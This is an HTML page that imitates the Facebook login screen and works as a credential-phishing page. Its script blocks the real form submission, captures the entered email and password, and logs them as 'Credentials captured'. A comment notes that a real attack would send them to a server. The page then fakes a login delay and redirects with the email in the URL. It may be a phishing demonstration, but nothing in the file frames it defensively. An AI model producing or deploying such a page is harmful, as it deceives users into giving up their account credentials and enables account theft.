<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); }
        .logo { color: #1877f2; font-size: 40px; text-align: center; margin-bottom: 20px; }
        h2 { text-align: center; color: #1c1e21; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
        button { width: 100%; background: #1877f2; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .forgot { text-align: center; margin-top: 15px; }
        .create { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #dddfe2; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <h2>Log into Facebook</h2>
        <form id="loginForm" action="/submit" method="post">
            <input type="text" name="email" placeholder="Email address or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="forgot">
            <a href="#" style="color: #1877f2; text-decoration: none;">Forgotten password?</a>
        </div>
        <div class="create">
            <a href="#" style="color: #1877f2; text-decoration: none;">Create new account</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get credentials
            var email = this.email.value;
            var password = this.password.value;
            
            // Log to console (in real attack, send to server)
            console.log('Credentials captured:');
            console.log('Email:', email);
            console.log('Password:', password);
            
            // Show loading
            this.querySelector('button').textContent = 'Logging in...';
            this.querySelector('button').disabled = true;
            
            // Redirect to "success" page
            setTimeout(function() {
                window.location.href = '/success.html?email=' + encodeURIComponent(email);
            }, 1500);
        });
    </script>
</body>
</html>
